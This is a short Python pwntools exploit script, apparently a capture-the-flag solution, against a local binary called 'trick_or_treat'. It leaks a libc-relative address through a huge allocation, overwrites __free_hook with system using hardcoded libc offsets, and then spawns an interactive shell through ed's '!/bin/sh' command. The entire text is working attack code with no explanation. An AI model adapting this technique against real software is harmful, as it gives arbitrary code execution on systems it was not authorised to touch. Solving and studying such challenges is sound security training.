from pwn import *

s = process('./trick_or_treat')

s.recvuntil('Size:')
s.sendline(str(1024*1024*1024))
s.recvuntil('0x')

buf= int(s.recv(12), 16)
libc = buf + 0x40000ff0
freehook = libc + 0x3ed8e8
system = libc+0x4f440

s.recvuntil('Offset & Value:\x00')
s.sendline(str(hex((freehook-buf)/8)))
s.sendline(hex(system))

s.recvuntil('Offset & Value:\x00')
s.sendline('A'*0x500)
s.sendline('ed')

s.sendline('!/bin/sh');
s.interactive()
